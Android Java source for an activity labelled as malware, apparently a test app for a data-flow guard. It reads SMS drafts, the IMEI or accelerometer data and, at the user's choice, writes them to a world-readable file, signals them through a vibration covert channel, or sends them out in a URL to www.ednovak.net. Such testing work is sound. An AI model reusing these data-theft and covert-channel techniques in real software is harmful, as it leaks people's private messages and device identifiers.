package net.ednovak.malware;

import android.app.Activity;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.hardware.Sensor;
import android.hardware.SensorEvent;
import android.hardware.SensorEventListener;
import android.hardware.SensorManager;
import android.net.Uri;
import android.os.Bundle;
import android.os.Vibrator;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.view.Menu;
import android.view.MenuItem;
import android.view.View;
import android.widget.Spinner;
import android.widget.Toast;
import android.widget.ToggleButton;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.util.ArrayList;
import java.util.Random;


public class Main extends Activity implements SensorEventListener{
    private final static String TAG = "Malware";

    enum FlowNode { SMS_DRAFT, ACCEL, IMEI, RAND, FILE, VIB, BROWSER, NETWORK, STOP }

    private boolean showMessages = false;
    private SensorManager mSensorManager;
    private ArrayList<Float> accelData = new ArrayList<Float>();
    private int accelDataGoalSize;


    private Vibrator vi;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.layout_main);
    }

    @Override
    protected void onPause(){
        super.onPause();
        if(mSensorManager!=null){
            mSensorManager.unregisterListener(this);
        }
        if(vi!=null){
            vi.cancel();
        }
    }

    @Override
    public boolean onCreateOptionsMenu(Menu menu) {
        // Inflate the menu; this adds items to the action bar if it is present.
        getMenuInflater().inflate(R.menu.main, menu);
        return true;
    }

    @Override
    public boolean onOptionsItemSelected(MenuItem item) {
        // Handle action bar item clicks here. The action bar will
        // automatically handle clicks on the Home/Up button, so long
        // as you specify a parent activity in AndroidManifest.xml.
        int id = item.getItemId();
        if (id == R.id.TestGuardService) {
            Intent i = new Intent(getApplicationContext(), TestGuardServer.class);
            startActivity(i);
            return true;
        }
        return super.onOptionsItemSelected(item);
    }

    // Entry point!
    public void pullFromSource(View v){

        // Get Source
        FlowNode source = readSpinner(R.id.source);
        Log.d(TAG, "Source: " + source);


        // Get Data from source
        String data = "";
        switch(source) {
            case SMS_DRAFT:
                data = pullSMS();
                break;
            case ACCEL:
                pullAccel(10); // special case, samples must flow to sink directly (timing is weird)
                break;
            case RAND:
                data = pullRand(10);
                break;
            case IMEI:
                data = pullIMEI();
        }

        // Show the message / data in a toast
        showMessage(data);

        // ACCEL is a special case!
        if(source != FlowNode.ACCEL) {
            sendToSink(data);
        }

    }

    private void sendToSink(String msg){

        // Get Sink
        FlowNode sink = readSpinner(R.id.sink);
        Log.d(TAG, "Sink: " + sink);


        switch(sink){
            case FILE:
                writeToFile("stash", msg);
                break;
            case VIB:
                writeToVibrationMotor(msg);
                break;
            case BROWSER:
                writeToBrowser(msg);
                break;
            case NETWORK:
                Toast.makeText(this, "Network Socket Not Yet Implemented", Toast.LENGTH_SHORT).show();
                break;
            case STOP:
                break;
        }
    }



    private FlowNode readSpinner(int ID){
        Spinner s = (Spinner)findViewById(ID);
        int idx = (int)s.getSelectedItemId();
        if(ID == R.id.source){
            switch(idx){
                case 0:
                    return FlowNode.SMS_DRAFT;
                case 1:
                    return FlowNode.ACCEL;
                case 2:
                    return FlowNode.RAND;
                case 3:
                    return FlowNode.IMEI;
            }
        }
        else{
            switch(idx){
                case 0:
                    return FlowNode.FILE;
                case 1:
                    return FlowNode.VIB;
                case 2:
                    return FlowNode.BROWSER;
                case 3:
                    return FlowNode.NETWORK;
                case 4:
                    return FlowNode.STOP;
            }
        }

        return null;
    }

    private String pullSMS(){

        Uri uri = Uri.parse( "content://sms/draft");
        String[] reqCols = new String[]{ "_id", "body"};
        ContentResolver cr = getContentResolver();
        Cursor c = cr.query(uri, reqCols, null, null, null);

        int id = c.getColumnIndex("_id");
        int body = c.getColumnIndex("body");
        if(c.getCount() == 0){
            Toast.makeText(this, "There are no SMS drafts", Toast.LENGTH_SHORT).show();
            return "";
        }
        c.moveToPosition(0);
        String msg = "ID: " + c.getInt(id) + "  body: " + c.getString(body);
        return msg;
    }



    public void pullAccel(int l){
        // Accelerometer
        mSensorManager = (SensorManager) getSystemService(Context.SENSOR_SERVICE);
        Sensor accelSensor = mSensorManager.getDefaultSensor(Sensor.TYPE_ACCELEROMETER);
        mSensorManager.registerListener(this, mSensorManager.getDefaultSensor(Sensor.TYPE_ACCELEROMETER), SensorManager.SENSOR_DELAY_NORMAL);

        accelDataGoalSize = l;
    }


    private String pullRand(int l){
        StringBuilder s = new StringBuilder();
        Random r = new Random();
        for(int i = 0; i < l; i++) {
            int tmp = r.nextInt(27) + 97;
            s.append(Character.toString((char) tmp));
        }
        return s.toString();
    }

    private String pullIMEI(){
        TelephonyManager tm = (TelephonyManager)getSystemService(Context.TELEPHONY_SERVICE);
        return tm.getDeviceId();
    }


    public void onAccuracyChanged(Sensor s, int accuracy){};
    public void onSensorChanged(SensorEvent event){
        if(event.sensor.getType() == Sensor.TYPE_ACCELEROMETER){
            //IllegalStateException e = new IllegalStateException();
            //e.printStackTrace();

            for(int i = 0; i < 3; i++){
                accelData.add(new Float(event.values[i]));
            }

            if(accelData.size() >= accelDataGoalSize*3) {
                mSensorManager.unregisterListener(this);

                String ans = "";
                for (int i = 0; i < accelData.size() / 3; i++) {
                    ans = ans + " x: " + accelData.get(i * 3) + "  y: " + accelData.get(i * 3 + 1) + "  z: " + accelData.get(i * 3 + 2);
                }
                showMessage(ans);
                sendToSink(ans);
            }


        }
    }




    private void writeToBrowser(String msg){
        String url = "http://www.ednovak.net/" + msg;
        Intent browserIntent = new Intent(Intent.ACTION_VIEW, Uri.parse(url));
        startActivity(browserIntent);
    }


    public void showFeedback(View v){
        boolean on = ((ToggleButton) v).isChecked();
        showMessages = on;
    }

    private void showMessage(String msg){
        if(showMessages && !msg.equals("")){
            Toast.makeText(this, msg, Toast.LENGTH_SHORT).show();
        }
    }

    private boolean writeToFile(String filename, String msg){
        FileOutputStream outputStream = null;
        try {
            outputStream = openFileOutput(filename, Context.MODE_WORLD_READABLE);
            outputStream.write(msg.getBytes());
            outputStream.close();
        } catch (Exception exception) {
            exception.printStackTrace();
            return false;
        }
        return true;
    }

    private boolean writeToVibrationMotor(String msg){

        String binary = strToBinary(msg);
        // Create pattern
        long[] pattern = new long[(binary.length()*2)+10];
        pattern[0] = 0; // start immediately
        for(int i = 0; i < binary.length(); i++){
            int j = i + 1;
            if(binary.charAt(i) == '1'){
                pattern[j*2-1] = 250; // Vibrate for 2000 ms, (1)
                pattern[j*2] = 20; // Wait for 20
            }
            else{
                pattern[j*2-1] = 125;  // Vibrate for shorter time, (0)
                pattern[j*2] = 20; // Wait for 20
            }
        }

        vi = (Vibrator) getSystemService(Context.VIBRATOR_SERVICE);
        if(vi.hasVibrator()){
            vi.vibrate(pattern, -1);
        }
        else{
            return false;
        }
        return true;
    }


    private String strToBinary(String input) {
        byte[] bytes = input.getBytes();
        StringBuilder binary = new StringBuilder();
        for (byte b : bytes) {
            int val = b;
            for (int i = 0; i < 8; i++) {
                binary.append((val & 128) == 0 ? 0 : 1);
                val <<= 1;
            }
            binary.append(' ');
        }
        return binary.toString();
    }

    public void stop(View v){
        Intent i = getIntent();
        finish();
        startActivity(i);
    }
}
